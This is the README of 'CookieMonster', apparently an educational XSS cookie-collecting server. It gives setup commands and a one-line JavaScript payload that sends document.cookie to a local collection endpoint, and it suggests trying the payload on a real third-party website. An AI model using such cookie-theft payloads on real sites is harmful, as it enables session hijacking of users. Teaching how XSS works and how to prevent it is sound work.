
# CookieMonster
Cross site scripting(XSS) cookie-fetch server, used for educational perpose only

Commands:

    npm install : install all dependencies
    npm start : starting the server
    npm run-script run : opens browser whilst starting the server

To use:

    Notice: This only works locally(logically), which means you 
    have to have a local server running with your website (and a database for comments/usercontent) 
    in order to test it.
    Go to the url: localhost:5123
    
    Copy and paste the content of payload.txt : 
        document.location='http://localhost:5123/cookie/'+document.cookie;
    into the console of another browser window or another device on your network.
    This textstring might be what the user run if your website is not secure.
    
    To test, try using the payload on a website like https://developer.mozilla.org/en-US/
    and see if the server retrives the cookie.
    
    Look in the console with cookiemonster to see the content of the cookie.

    Alternativly, press space to spawn unlimited amount of cookies!
    
Contributions:

    Any contributions is appreaciated to improve the understanding 
    of how XSS works and how to prevent it.
    
    
